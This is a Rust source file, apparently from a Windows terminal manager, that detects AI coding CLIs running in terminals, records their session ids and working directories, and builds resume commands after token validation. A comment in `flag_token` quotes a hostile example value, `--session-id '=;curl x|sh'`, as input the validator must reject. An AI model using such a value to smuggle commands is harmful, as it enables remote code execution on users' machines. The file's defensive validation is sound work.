//! Session tracker: per running Shell/Custom terminal, records the live shell
//! cwd and any hand-run CLI (e.g. `claude`) so a restart can resume both.
//!
//! cwd comes from an OSC 9;9 report (freshest, see session.rs) when available,
//! else the PEB of the deepest descendant. Inner-CLI identity comes from the
//! process argv (Explicit) or timestamp correlation against session journals
//! (Correlated); genuine ambiguity is surfaced, never guessed.

use std::path::{Path, PathBuf};
use std::time::{Duration, SystemTime};

use uuid::Uuid;

use crate::state::{claude_project_dir_name, CliConfidence, InnerCli, NestedChain};

use super::procinfo;

pub struct TrackSample {
    pub live_cwd: Option<PathBuf>,
    pub inner_cli: Option<InnerCli>,
    /// Attribution Layer 1: the LIVE session id claude's own pid registry
    /// (`~/.claude/sessions/<pid>.json`, liveness+start gated) reports for
    /// the tracked claude descendant, when one exists. For Shell/Custom
    /// terminals it already rides `inner_cli` (Explicit); for Claude-KIND
    /// terminals — where inner_cli is never applied — it drives the live
    /// pin re-target in `apply_track_sample` (an in-TUI `/clear` or
    /// `/resume` switch updates the file within ~100ms on claude ≥2.1.200,
    /// so the pinned id follows the conversation the user actually sees).
    pub claude_live: Option<Uuid>,
}

/// How a descendant process is recognized as a CLI adapter. argv is read before
/// matching so runtime carriers (node/bun/python running an npm/py CLI) resolve
/// to the real tool name rather than the interpreter.
enum Match {
    /// Match by executable stem, e.g. ["codex"].
    ExeStem(&'static [&'static str]),
    /// A runtime (node/bun/python) whose argv names the tool.
    RuntimeArgv {
        runtimes: &'static [&'static str],
        needle: &'static str,
    },
    /// Either an exe-stem match or a runtime+argv match.
    Either {
        stems: &'static [&'static str],
        runtimes: &'static [&'static str],
        needle: &'static str,
    },
}

impl Match {
    fn matches(&self, stem: &str, argv: &[String]) -> bool {
        match self {
            Match::ExeStem(stems) => stems.contains(&stem),
            Match::RuntimeArgv { runtimes, needle } => {
                runtimes.contains(&stem) && argv_names_tool(argv, needle)
            }
            Match::Either {
                stems,
                runtimes,
                needle,
            } => stems.contains(&stem) || (runtimes.contains(&stem) && argv_names_tool(argv, needle)),
        }
    }
}

/// Adapter token extraction: (argv, cwd, process start FILETIME) →
/// (resume token, confidence).
type ExtractFn = fn(&[String], &Path, Option<u64>) -> (Option<String>, CliConfidence);

struct Adapter {
    key: &'static str,
    matcher: Match,
    /// Compiled in but skipped unless enabled — flagged adapters ship off.
    enabled: bool,
    extract: ExtractFn,
    /// Trailing resume command for a restore; None → cannot resume.
    restore: fn(Option<&str>) -> Option<String>,
}

/// Birth-correlation window: a store file (session jsonl / rollout) born
/// within this of the process start belongs to that process. Wide enough for
/// a CLI's slow first write on a loaded machine, narrow enough that an older
/// parallel session in the same cwd stays outside it.
const BIRTH_WINDOW: Duration = Duration::from_secs(30);

/// Mtime-newest tie-breaker floor: two candidates written within this of
/// each other are both plausibly live (parallel sessions in one cwd) —
/// newest-wins must abstain rather than guess.
const MTIME_TIE_GAP: Duration = Duration::from_secs(5);

const NODE_RT: &[&str] = &["node"];
const NODE_BUN_RT: &[&str] = &["node", "bun"];
const PY_RT: &[&str] = &["python", "python3"];

const ADAPTERS: &[Adapter] = &[
    // ── Claude: pinned-id path, unchanged. ──
    Adapter {
        key: "claude",
        matcher: Match::ExeStem(&["claude"]),
        enabled: true,
        extract: claude_extract,
        restore: |t| t.map(|t| format!("claude --resume {t}")),
    },
    // ── Enabled, exact-id verified. ──
    Adapter {
        key: "codex",
        matcher: Match::ExeStem(&["codex"]),
        enabled: true,
        extract: codex_extract,
        restore: |t| t.map(|t| format!("codex resume {t}")),
    },
    Adapter {
        key: "copilot",
        matcher: Match::Either { stems: &["copilot"], runtimes: NODE_RT, needle: "copilot" },
        enabled: true,
        extract: copilot_extract,
        restore: |t| t.map(|t| format!("copilot --resume {t}")),
    },
    Adapter {
        key: "qwen",
        matcher: Match::Either { stems: &["qwen"], runtimes: NODE_RT, needle: "qwen" },
        enabled: true,
        extract: qwen_extract,
        restore: |t| t.map(|t| format!("qwen --resume {t}")),
    },
    Adapter {
        key: "goose",
        matcher: Match::ExeStem(&["goose"]),
        enabled: true,
        extract: goose_extract,
        restore: |t| t.map(|t| format!("goose session --resume --session-id {t}")),
    },
    Adapter {
        key: "opencode",
        matcher: Match::Either { stems: &["opencode"], runtimes: NODE_BUN_RT, needle: "opencode" },
        enabled: true,
        extract: opencode_extract,
        restore: |t| t.map(|t| format!("opencode --session {t}")),
    },
    Adapter {
        key: "crush",
        matcher: Match::ExeStem(&["crush"]),
        enabled: true,
        extract: crush_extract,
        restore: |t| t.map(|t| format!("crush --session {t}")),
    },
    // ── Shipped OFF by default (unverified storage / correlation). ──
    Adapter {
        key: "devin",
        matcher: Match::ExeStem(&["devin"]),
        enabled: false,
        extract: devin_extract,
        restore: |t| Some(t.map(|t| format!("devin -r {t}")).unwrap_or_else(|| "devin -c".into())),
    },
    Adapter {
        key: "cursor",
        matcher: Match::ExeStem(&["cursor-agent", "agent"]),
        enabled: false,
        extract: cursor_extract,
        restore: |t| t.map(|t| format!("cursor-agent --resume {t}")),
    },
    Adapter {
        key: "amp",
        matcher: Match::Either { stems: &["amp"], runtimes: NODE_RT, needle: "amp" },
        enabled: false,
        extract: amp_extract,
        restore: |t| t.map(|t| format!("amp threads continue {t}")),
    },
    Adapter {
        key: "cline",
        matcher: Match::Either { stems: &["cline"], runtimes: NODE_RT, needle: "cline" },
        enabled: false,
        extract: cline_extract,
        restore: |t| t.map(|t| format!("cline --id {t}")),
    },
    Adapter {
        key: "gemini",
        // Real name only shows up in argv (node carrier).
        matcher: Match::RuntimeArgv { runtimes: NODE_RT, needle: "gemini" },
        enabled: false,
        extract: gemini_extract,
        restore: |_| Some("gemini --resume".into()),
    },
    Adapter {
        key: "aider",
        matcher: Match::Either { stems: &["aider"], runtimes: PY_RT, needle: "aider" },
        enabled: false,
        extract: aider_extract,
        restore: |_| Some("aider --restore-chat-history".into()),
    },
    // NOTE: no adapter for Amazon Q / Kiro — they run under WSL and are invisible
    // to this Win32 process tracker.
];

/// Resume command for an adapter, by key (used by the daemon's restore path).
/// None if the adapter is unknown or cannot resume with the given token.
pub fn restore_trailing(adapter_key: &str, token: Option<&str>) -> Option<String> {
    // Final gate for the injection class (r3-S1): the token is spliced
    // UNQUOTED into a shell command line (bash rc trailings, `cmd /K`, pwsh
    // -Command) — the trailings' `'`-refusal guards only their exec-hook
    // JSON quoting, NOT the token. Tokens reach here from argv capture
    // (already charset-validated in `flag_token`), from UUID-validated
    // remote stores, or from state.json (the hostile-config threat model) —
    // re-validate at the one choke point every restore path shares.
    if token.is_some_and(|t| !safe_resume_token(t)) {
        log::warn!("restore_trailing({adapter_key}): unsafe resume token refused");
        return None;
    }
    ADAPTERS
        .iter()
        .find(|a| a.key == adapter_key)
        .and_then(|a| (a.restore)(token))
}

/// r3-S1: the ONLY shape a resume token may have anywhere in the system. It
/// is spliced UNQUOTED into restore command lines executed by bash, cmd.exe
/// AND PowerShell (quoting is not portable across the three), so the charset
/// must contain no byte any of them treats as syntax: `[A-Za-z0-9._:@-]`,
/// no leading `-` (flag smuggling), bounded length. Every real token shape —
/// UUIDs, amp `T-…` thread ids, goose timestamped names, codex rollout stems
/// — fits comfortably.
pub(crate) fn safe_resume_token(t: &str) -> bool {
    !t.is_empty()
        && t.len() <= 128
        && !t.starts_with('-')
        && t.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b':' | b'@' | b'-'))
}

fn exe_stem(exe: &str) -> String {
    Path::new(exe)
        .file_stem()
        .map(|s| s.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default()
}

/// True if any argv element (after the runtime) names `needle`: a path component
/// whose stem equals `needle` or begins with `needle-` (so
/// "@scope/gemini-cli/dist/index.js" and ".bin/gemini" both match "gemini",
/// while "examples/…" does not match "amp").
fn argv_names_tool(argv: &[String], needle: &str) -> bool {
    argv.iter().skip(1).any(|arg| {
        arg.to_ascii_lowercase().split(['/', '\\']).any(|comp| {
            let stem = comp.split('.').next().unwrap_or(comp);
            stem == needle || stem.starts_with(&format!("{needle}-")) || comp == needle
        })
    })
}

/// Value after `flag` (space form) or `flag=value` form, for any of `flags`.
fn argv_flag_value(argv: &[String], flags: &[&str]) -> Option<String> {
    for (i, a) in argv.iter().enumerate() {
        for f in flags {
            if a == f {
                if let Some(v) = argv.get(i + 1) {
                    return Some(v.trim_matches('"').to_string());
                }
            }
            if let Some(v) = a.strip_prefix(&format!("{f}=")) {
                return Some(v.trim_matches('"').to_string());
            }
        }
    }
    None
}

/// Element immediately following a consecutive subcommand sequence, e.g. `resume`
/// in `codex resume <id>` or `threads continue` in amp.
fn argv_after_subcommand(argv: &[String], seq: &[&str]) -> Option<String> {
    argv.windows(seq.len())
        .position(|w| w.iter().zip(seq).all(|(a, b)| a == b))
        .and_then(|pos| argv.get(pos + seq.len()).cloned())
        .map(|s| s.trim_matches('"').to_string())
}

/// Inspect a running session's process tree using a shared process-table
/// snapshot. `osc_cwd` is the freshest cwd from the OSC scanner, if any.
pub fn analyze(
    table: &[(u32, u32, String)],
    root_pid: u32,
    osc_cwd: Option<PathBuf>,
) -> TrackSample {
    let descendants = procinfo::descendants_of(table, root_pid);

    // Live cwd: OSC report wins; else the deepest descendant with a readable
    // PEB cwd (a hand-run tool inherits the shell's location); else the shell.
    let mut live_cwd = osc_cwd;
    if live_cwd.is_none() {
        for e in descendants.iter().rev() {
            if let Some(c) = procinfo::read_process_cwd(e.pid) {
                live_cwd = Some(c);
                break;
            }
        }
    }
    if live_cwd.is_none() {
        live_cwd = procinfo::read_process_cwd(root_pid);
    }

    // Inner CLI: the first of ROOT + descendants that matches an enabled
    // adapter. The root is included because a Claude-KIND terminal's claude
    // process IS the ConPTY root (spawned directly, no shell) — excluding it
    // would blind the Layer-1 registry read exactly where the pin lives; for
    // Shell terminals the root is the shell and matches nothing. argv is
    // read per-process (before matching) so runtime carriers resolve
    // correctly.
    let mut inner_cli = None;
    let mut claude_live = None;
    let root_entry = table
        .iter()
        .find(|(pid, _, _)| *pid == root_pid)
        .map(|(pid, _, exe)| procinfo::ProcEntry {
            pid: *pid,
            exe: exe.clone(),
        });
    'outer: for e in root_entry.iter().chain(descendants.iter()) {
        let stem = exe_stem(&e.exe);
        let argv = procinfo::read_process_cmdline(e.pid).unwrap_or_default();
        for adapter in ADAPTERS {
            if !adapter.enabled {
                continue;
            }
            if adapter.matcher.matches(&stem, &argv) {
                let cwd = procinfo::read_process_cwd(e.pid)
                    .or_else(|| live_cwd.clone())
                    .unwrap_or_default();
                let start = procinfo::process_start_filetime(e.pid);
                // Attribution Layer 1 first: for a live claude descendant,
                // the pid registry (claude's own self-report, liveness+start
                // gated) outranks BOTH the argv and the birth/mtime
                // correlation — argv lies after an in-TUI /resume switch (it
                // keeps the stale --session-id), and the registry follows
                // /clear and /resume within ~100ms on ≥2.1.200. It is also
                // ONE file read, where the extract's correlation lists and
                // stats every jsonl under ~/.claude/projects/<munge>/ per
                // 300ms tick — so the extract runs only when the registry
                // abstains (absent/stale/older claude); its verdict then
                // stands exactly as before.
                let registry_sid = (adapter.key == "claude")
                    .then(|| {
                        super::claude_registry::local_sessions_dir().and_then(|d| {
                            super::claude_registry::live_session_for_pid(&d, e.pid, start)
                        })
                    })
                    .flatten();
                let (token, confidence) = match registry_sid {
                    Some(sid) => {
                        claude_live = Some(sid);
                        (Some(sid.to_string()), CliConfidence::Explicit)
                    }
                    None => (adapter.extract)(&argv, &cwd, start),
                };
                inner_cli = Some(InnerCli {
                    adapter: adapter.key.to_string(),
                    resume_token: token,
                    confidence,
                    cwd,
                    nested: false,
                });
                break 'outer;
            }
        }
    }

    TrackSample {
        live_cwd,
        inner_cli,
        claude_live,
    }
}

/// Hook-based inner-CLI detection for shells whose process trees are
/// invisible to the Win32 tracker (WSL in P6a; ssh in P6c): the exec hook's
/// command line IS the argv the adapters were built to parse. `cwd` is the
/// last hook-reported cwd (POSIX, verbatim).
///
/// D11 (remote-cli-resume-spec): every caller of this function analyzes a
/// REMOTE/hook-fed world (Ssh, WslShell), but the adapter `extract` fns'
/// correlation branches read the LOCAL filesystem (`claude_extract` walks
/// the LOCAL ~/.claude/projects/<munge(cwd)>). A local dir that happens to
/// munge like a remote posix cwd would mint a WRONG token with Correlated
/// confidence — so the verdict is SANITIZED here: only argv-Explicit tokens
/// survive; everything else degrades to token-less Ambiguous (the remote
/// correlate leg / a future \\wsl$ leg supplies real evidence later).
pub fn analyze_cmdline(cmd: &str, cwd: &Path) -> Option<InnerCli> {
    let argv = split_cmdline(cmd);
    let first = argv.first()?;
    // argv[0] stem: last path component, extension dropped (works for both
    // "/usr/local/bin/claude" and bare "claude").
    let stem = first
        .rsplit(['/', '\\'])
        .next()
        .map(|c| {
            c.strip_suffix(".exe")
                .unwrap_or(c)
                .to_ascii_lowercase()
        })
        .unwrap_or_default();
    for adapter in ADAPTERS {
        if !adapter.enabled {
            continue;
        }
        if adapter.matcher.matches(&stem, &argv) {
            let (token, confidence) = (adapter.extract)(&argv, cwd, None);
            // D11 sanitize: Explicit-or-nothing out of a remote analysis.
            let (token, confidence) = match confidence {
                CliConfidence::Explicit => (token, confidence),
                _ => (None, CliConfidence::Ambiguous),
            };
            return Some(InnerCli {
                adapter: adapter.key.to_string(),
                resume_token: token,
                confidence,
                cwd: cwd.to_path_buf(),
                nested: false,
            });
        }
    }
    None
}

/// Bug D / F1: does this command spawn a NESTED INTERACTIVE SHELL? The
/// integration is process-local to the login shell (delivered via one-shot
/// rcfile), so `sudo su` / `su` / a plain nested `bash` produce NO hook
/// events for anything typed inside them. Moved here from `gui::composer`
/// (still re-exported there) because the daemon now uses the SAME verdict to
/// start the F1 nested-chain breadcrumb in `track_hook_exec` — one
/// classifier, zero drift between the composer's honesty lane and the
/// breadcrumb. Pure and conservative by design: a false negative degrades to
/// today's behavior (Busy row / no breadcrumb), a false positive still
/// records a true statement. v2 candidates (same table, deliberately out of
/// v1): `ssh <dest>` with no command operand, `docker exec -it …`, `wsl`,
/// `nix shell`.
pub fn nested_shell_cmd(cmd: &str) -> bool {
    let argv: Vec<&str> = cmd.split_whitespace().collect();
    nested_shell_argv(&argv)
}

fn nested_shell_argv(argv: &[&str]) -> bool {
    let Some(first) = argv.first() else {
        return false;
    };
    // argv[0] stem: last path component, extension dropped (same shape as
    // tracker::analyze_cmdline — works for "/usr/bin/bash" and bare "bash").
    let stem = first
        .rsplit(['/', '\\'])
        .next()
        .map(|c| c.strip_suffix(".exe").unwrap_or(c).to_ascii_lowercase())
        .unwrap_or_default();
    match stem.as_str() {
        // su/login: non-flag operands are USERNAMES (`su - root`) — still an
        // interactive shell; only an explicit -c command makes it finite.
        "su" | "login" => !argv[1..]
            .iter()
            .any(|a| *a == "-c" || a.starts_with("--command")),
        // Shells: interactive unless a -c command or a script/stdin operand
        // follows (`bash -l` yes; `bash -c …` / `bash script.sh` / `bash -`
        // no). A flag-value miss (`bash --rcfile x`) reads x as an operand
        // and returns false — conservative, degrades to the Busy row.
        "bash" | "zsh" | "sh" | "dash" | "fish" | "ksh" => !argv[1..]
            .iter()
            .any(|a| *a == "-c" || *a == "-" || !a.starts_with('-')),
        // sudo: -i/-s mean "give me a shell" outright; otherwise skip sudo's
        // own flags (value-consuming ones eat their operand) and classify
        // the wrapped command. Bare `sudo` prints usage — false.
        "sudo" => {
            let mut i = 1;
            while i < argv.len() {
                match argv[i] {
                    "-i" | "--login" | "-s" | "--shell" => return true,
                    // Value-consuming short flags (sudo 1.9 table).
                    "-u" | "-g" | "-U" | "-h" | "-p" | "-C" | "-D" | "-R" | "-T" | "-r"
                    | "-t" | "-B" => i += 2,
                    "--" => return nested_shell_argv(&argv[i + 1..]),
                    a if a.starts_with('-') => i += 1, // -E, -H, -n, --user=x, -uroot
                    _ => return nested_shell_argv(&argv[i..]),
                }
            }
            false
        }
        _ => false,
    }
}

/// F1: is `key` an enabled CLI adapter? Gates the nested-beacon mint — a
/// beacon may CREATE cli state there (no exec hook can precede it inside a
/// nested shell), so the adapter slot must at least name a tool the
/// registry knows.
pub fn known_adapter(key: &str) -> bool {
    ADAPTERS.iter().any(|a| a.enabled && a.key == key)
}

/// Cap on recorded breadcrumb commands — a re-establish line is a hint, not
/// a transcript. Beyond this the chain stops growing (first links win: the
/// opener and the early hops are the load-bearing part).
pub const NESTED_CHAIN_MAX: usize = 8;

/// F1 spec I1, factored so the invariant is testable as a table: may this
/// identity feed a restore's AUTO-RESUME composition? Only a confident,
/// NON-nested identity ever may — a nested one is display/preface-only (the
/// resume would run as the ssh login user against the nested account's
/// session store: structurally the wrong store, and the failure used to
/// consume the identity).
pub fn cli_wants_resume(cli: &InnerCli) -> bool {
    !cli.nested
        && matches!(
            cli.confidence,
            CliConfidence::Explicit | CliConfidence::Correlated
        )
}

/// Char-safe display truncation: first `max` chars, with `…` marking a cut.
fn truncate_chars(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        return s.to_string();
    }
    let mut out: String = s.chars().take(max).collect();
    out.push('…');
    out
}

/// F1 preface composition (spec §4.3, golden-tested byte-exact): the honest,
/// copy-pasteable re-establish line a restore prints INSTEAD of
/// auto-resuming into a privilege boundary. `cli` is the nested-tagged
/// identity when a beacon attributed one (callers filter on `nested`).
///
/// Variants:
/// - A (identity + beacon-witnessed cwd): chain; `cd '<cwd>'`; resume.
/// - B (identity, no witnessed cwd — or an over-long one): chain; resume;
///   "(run it from the conversation's directory)".
/// - C (no identity / no token / unsafe token): chain only, manual hint.
///
/// Escaping choke points: the token prints only when `safe_resume_token`
/// passes (r3-S1 — same charset gate every restore shares; unsafe ⇒ C, never
/// a mangled command); the cd path comes ONLY from the beacon-witnessed
/// `chain.cli_cwd`, single-quoted via `bootstrap::sh_single_quote`, and is
/// dropped (⇒ B) when its quoted form exceeds 120 display chars; recorded
/// commands are relayed as display text with control bytes stripped (no
/// terminal-sequence smuggling into the preface), joined and truncated
/// char-safe at 100 chars.
///
/// F2 (`auto` = the launch armed the chain re-establish): the line says the
/// chain is being re-typed automatically instead of asking for it — but the
/// inner-CLI half keeps the manual resume hint verbatim (the CLI is never
/// auto-resumed across the boundary; I1 unchanged). The pre-F2 wording is
/// preserved byte-exact for `auto = false` (opt-out / hookless spawns).
pub fn nested_restore_notice(chain: &NestedChain, cli: Option<&InnerCli>, auto: bool) -> String {
    let joined = chain
        .cmds
        .iter()
        .map(|s| sanitize_display_cmd(s))
        .filter(|s| !s.is_empty())
        .collect::<Vec<_>>()
        .join("; ");
    let c = if joined.is_empty() {
        "nested shell".to_string()
    } else {
        truncate_chars(&joined, 100)
    };
    let identity = cli.and_then(|cli| {
        let t = cli.resume_token.as_deref()?;
        safe_resume_token(t).then(|| (cli.adapter.clone(), t.to_string()))
    });
    let Some((a, t)) = identity else {
        // Variant C.
        return if auto {
            format!(
                "── re-establishing this terminal's nested shell ({c}) automatically; anything that ran inside it was not restored ──"
            )
        } else {
            format!(
                "── this terminal had a nested shell ({c}); anything running inside it was not restored — re-establish it manually ──"
            )
        };
    };
    let quoted_cd = chain
        .cli_cwd
        .as_ref()
        .map(|p| super::bootstrap::sh_single_quote(&p.to_string_lossy()))
        .filter(|q| q.chars().count() <= 120);
    if auto {
        return match quoted_cd {
            // Auto variant A: the chain types itself; the resume stays manual.
            Some(q) => format!(
                "── re-establishing this terminal's nested shell ({c}) automatically; its {a} session was not auto-resumed — resume: cd {q}; {a} --resume {t} ──"
            ),
            // Auto variant B.
            None => format!(
                "── re-establishing this terminal's nested shell ({c}) automatically; its {a} session was not auto-resumed — resume: {a} --resume {t} (run it from the conversation's directory) ──"
            ),
        };
    }
    match quoted_cd {
        // Variant A.
        Some(q) => format!(
            "── this terminal had a nested shell ({c}); its {a} session was not auto-resumed — re-establish: {c}; cd {q}; {a} --resume {t} ──"
        ),
        // Variant B.
        None => format!(
            "── this terminal had a nested shell ({c}); its {a} session was not auto-resumed — re-establish: {c}; {a} --resume {t} (run it from the conversation's directory) ──"
        ),
    }
}

/// Strip control bytes from a user-typed command destined for display text
/// (preface). Keeps everything printable verbatim.
fn sanitize_display_cmd(s: &str) -> String {
    s.chars()
        .filter(|c| !c.is_control())
        .collect::<String>()
        .trim()
        .to_string()
}

/// F1 spec §2.4: append a D2-lane nested-shell spawn to the breadcrumb.
/// Pure so the cap+dedupe table is unit-testable: consecutive duplicates
/// collapse (a retried `sudo su` is one hop), the chain never exceeds
/// `NESTED_CHAIN_MAX`. Returns whether the chain changed.
pub fn append_nested_cmd(cmds: &mut Vec<String>, cmd: &str) -> bool {
    let cmd = cmd.trim();
    if cmd.is_empty() || cmds.len() >= NESTED_CHAIN_MAX {
        return false;
    }
    if cmds.last().is_some_and(|last| last == cmd) {
        return false;
    }
    cmds.push(cmd.to_string());
    true
}

/// Naive quote-aware whitespace split (P6 §7.2): single quotes literal,
/// double quotes grouping, backslash escapes the next char outside single
/// quotes. Good enough for adapter argv shapes; a shell-perfect parse is
/// explicitly out of scope (the adapters only read flags and UUID tokens).
fn split_cmdline(cmd: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut in_word = false;
    let mut chars = cmd.chars().peekable();
    while let Some(ch) = chars.next() {
        match ch {
            c if c.is_whitespace() => {
                if in_word {
                    out.push(std::mem::take(&mut cur));
                    in_word = false;
                }
            }
            '\'' => {
                in_word = true;
                for c in chars.by_ref() {
                    if c == '\'' {
                        break;
                    }
                    cur.push(c);
                }
            }
            '"' => {
                in_word = true;
                while let Some(c) = chars.next() {
                    match c {
                        '"' => break,
                        '\\' => {
                            if let Some(n) = chars.next() {
                                if n != '"' && n != '\\' {
                                    cur.push('\\');
                                }
                                cur.push(n);
                            }
                        }
                        c => cur.push(c),
                    }
                }
            }
            '\\' => {
                in_word = true;
                if let Some(n) = chars.next() {
                    cur.push(n);
                }
            }
            c => {
                in_word = true;
                cur.push(c);
            }
        }
    }
    if in_word {
        out.push(cur);
    }
    out
}

/// Parse a claude command line for an explicit session id.
pub fn parse_claude_session(argv: &[String]) -> Option<Uuid> {
    let mut it = argv.iter();
    while let Some(arg) = it.next() {
        for pfx in ["--resume=", "--session-id="] {
            if let Some(v) = arg.strip_prefix(pfx) {
                if let Ok(u) = Uuid::parse_str(v.trim_matches('"')) {
                    return Some(u);
                }
            }
        }
        if arg == "--resume" || arg == "--session-id" {
            if let Some(v) = it.next() {
                if let Ok(u) = Uuid::parse_str(v.trim_matches('"')) {
                    return Some(u);
                }
            }
        }
    }
    None
}

fn filetime_to_systemtime(ft: u64) -> SystemTime {
    // FILETIME: 100ns ticks since 1601-01-01; Unix epoch is 11644473600s later.
    const EPOCH_DIFF_SECS: u64 = 11_644_473_600;
    let secs = ft / 10_000_000;
    if secs < EPOCH_DIFF_SECS {
        return SystemTime::UNIX_EPOCH;
    }
    SystemTime::UNIX_EPOCH + Duration::from_secs(secs - EPOCH_DIFF_SECS)
}

fn abs_diff(a: SystemTime, b: SystemTime) -> Duration {
    a.duration_since(b).unwrap_or_else(|_| b.duration_since(a).unwrap_or_default())
}

/// Wake-time re-pin evidence for a PINNED-id claude terminal: did the
/// previous run rotate its session id under the pin (fork-on-resume /
/// `/clear`)? Rules — abstain everywhere short of certainty:
/// - the PINNED transcript was written during the run window ⇒ the pin is
///   the live conversation, keep it (None);
/// - otherwise, EXACTLY ONE session jsonl in the project dir was BORN
///   inside the run window ⇒ that is this terminal's conversation (Some);
/// - zero or ≥2 candidates ⇒ None (wrong-session resume is worse than a
///   fresh session — the Ambiguous doctrine).
///
/// `spawn_ms`/`end_ms` are wall-clock ms of the previous process's life
/// (Core::spawn_times); WINDOW_SLACK absorbs clock/flush skew.
pub fn claude_repin_candidate(
    cwd: &Path,
    pinned: Uuid,
    spawn_ms: u64,
    end_ms: u64,
) -> Option<Uuid> {
    let dir = crate::state::claude_session_file(cwd, &pinned)?
        .parent()?
        .to_path_buf();
    claude_repin_candidate_in(&dir, pinned, spawn_ms, end_ms)
}

/// Testable core of `claude_repin_candidate` (injected project dir).
pub fn claude_repin_candidate_in(
    dir: &Path,
    pinned: Uuid,
    spawn_ms: u64,
    end_ms: u64,
) -> Option<Uuid> {
    const WINDOW_SLACK: Duration = Duration::from_secs(5);
    let ms = |t: SystemTime| {
        t.duration_since(SystemTime::UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0)
    };
    let lo = spawn_ms.saturating_sub(WINDOW_SLACK.as_millis() as u64);
    let hi = end_ms.saturating_add(WINDOW_SLACK.as_millis() as u64);
    let mut born_in_window: Vec<Uuid> = Vec::new();
    let rd = std::fs::read_dir(dir).ok()?;
    for entry in rd.flatten() {
        let path = entry.path();
        if path.extension().and_then(|e| e.to_str()) != Some("jsonl") {
            continue;
        }
        let Some(uid) = path
            .file_stem()
            .and_then(|s| s.to_str())
            .and_then(|s| Uuid::parse_str(s).ok())
        else {
            continue;
        };
        let Ok(meta) = entry.metadata() else { continue };
        if uid == pinned {
            // The pin is alive: its transcript moved during the run.
            let mtime = meta.modified().map(ms).unwrap_or(0);
            if mtime >= lo {
                return None;
            }
            continue;
        }
        let born = meta.created().map(ms).unwrap_or(0);
        if born >= lo && born <= hi {
            born_in_window.push(uid);
        }
    }
    match born_in_window.as_slice() {
        [one] => Some(*one),
        _ => None,
    }
}

/// Claude adapter: explicit id from argv, else correlate journals by birth time
/// near the process start, else newest mtime. Genuine ties → Ambiguous.
fn claude_extract(
    argv: &[String],
    cwd: &Path,
    start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    if let Some(id) = parse_claude_session(argv) {
        return (Some(id.to_string()), CliConfidence::Explicit);
    }
    let Some(home) = dirs::home_dir() else {
        return (None, CliConfidence::Ambiguous);
    };
    let dir = home
        .join(".claude")
        .join("projects")
        .join(claude_project_dir_name(cwd));

    // (uuid, birth, mtime) for each session journal.
    let mut cands: Vec<(Uuid, Option<SystemTime>, SystemTime)> = Vec::new();
    if let Ok(rd) = std::fs::read_dir(&dir) {
        for entry in rd.flatten() {
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) != Some("jsonl") {
                continue;
            }
            let Some(uid) = path
                .file_stem()
                .and_then(|s| s.to_str())
                .and_then(|s| Uuid::parse_str(s).ok())
            else {
                continue;
            };
            let Ok(meta) = entry.metadata() else { continue };
            let birth = meta.created().ok();
            let mtime = meta.modified().unwrap_or(SystemTime::UNIX_EPOCH);
            cands.push((uid, birth, mtime));
        }
    }
    if cands.is_empty() {
        return (None, CliConfidence::Ambiguous);
    }

    // Prefer a journal born within BIRTH_WINDOW of the process starting.
    if let Some(start) = start_ft.map(filetime_to_systemtime) {
        let near: Vec<Uuid> = cands
            .iter()
            .filter(|(_, birth, _)| {
                birth.is_some_and(|b| abs_diff(b, start) <= BIRTH_WINDOW)
            })
            .map(|(u, _, _)| *u)
            .collect();
        if near.len() == 1 {
            return (Some(near[0].to_string()), CliConfidence::Correlated);
        }
        if near.len() >= 2 {
            return (None, CliConfidence::Ambiguous);
        }
    }

    // Fall back to the most-recently-written journal (the active session).
    cands.sort_by_key(|c| std::cmp::Reverse(c.2));
    if cands.len() == 1 {
        return (Some(cands[0].0.to_string()), CliConfidence::Correlated);
    }
    let gap = abs_diff(cands[0].2, cands[1].2);
    if gap < MTIME_TIE_GAP {
        return (None, CliConfidence::Ambiguous);
    }
    (Some(cands[0].0.to_string()), CliConfidence::Correlated)
}

/// (stem, birth, mtime) for entries under `dir`: files with extension `ext`,
/// or directories when `ext` is None, descending `depth` intermediate levels
/// (codex nests sessions as YYYY/MM/DD/, qwen as <project>/chats/).
fn session_entries(
    dir: &Path,
    ext: Option<&str>,
    depth: u8,
) -> Vec<(String, Option<SystemTime>, SystemTime)> {
    let mut out = Vec::new();
    let Ok(rd) = std::fs::read_dir(dir) else {
        return out;
    };
    for e in rd.flatten() {
        let path = e.path();
        let is_dir = path.is_dir();
        match ext {
            Some(x) => {
                if is_dir {
                    if depth > 0 {
                        out.extend(session_entries(&path, ext, depth - 1));
                    }
                    continue;
                }
                if path.extension().and_then(|s| s.to_str()) != Some(x) {
                    continue;
                }
            }
            None => {
                if !is_dir {
                    continue;
                }
            }
        }
        let Some(stem) = path.file_stem().and_then(|s| s.to_str()).map(String::from) else {
            continue;
        };
        let Ok(meta) = e.metadata() else { continue };
        out.push((
            stem,
            meta.created().ok(),
            meta.modified().unwrap_or(SystemTime::UNIX_EPOCH),
        ));
    }
    out
}

/// A UNIQUE entry born within BIRTH_WINDOW of the process start → Correlated. Anything
/// else (no start time, zero or multiple candidates) → Ambiguous. Used for
/// stores that are global across terminals, where mtime-newest could belong to
/// a different session and must not be trusted.
fn birth_correlate(
    entries: &[(String, Option<SystemTime>, SystemTime)],
    start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    let Some(start) = start_ft.map(filetime_to_systemtime) else {
        return (None, CliConfidence::Ambiguous);
    };
    let near: Vec<&str> = entries
        .iter()
        .filter(|(_, birth, _)| {
            birth.is_some_and(|b| abs_diff(b, start) <= BIRTH_WINDOW)
        })
        .map(|(s, _, _)| s.as_str())
        .collect();
    match near.len() {
        1 => (Some(near[0].to_string()), CliConfidence::Correlated),
        _ => (None, CliConfidence::Ambiguous),
    }
}

/// Flag value that is a real resume token: not another flag (missing-value
/// guard) and strictly charset-valid (r3-S1 — this is the capture choke
/// point for every adapter without its own UUID validation; a hostile value
/// like `--session-id '=;curl x|sh'` must die here, years before a restore
/// would splice it unquoted into a shell).
fn flag_token(argv: &[String], flags: &[&str]) -> Option<String> {
    argv_flag_value(argv, flags).filter(|v| safe_resume_token(v))
}

/// The trailing 36 chars of `s` parsed as a UUID (codex rollout stems are
/// `rollout-<timestamp>-<uuid>`). Shared with the remote store descriptors
/// (remote_probe's codex token_of).
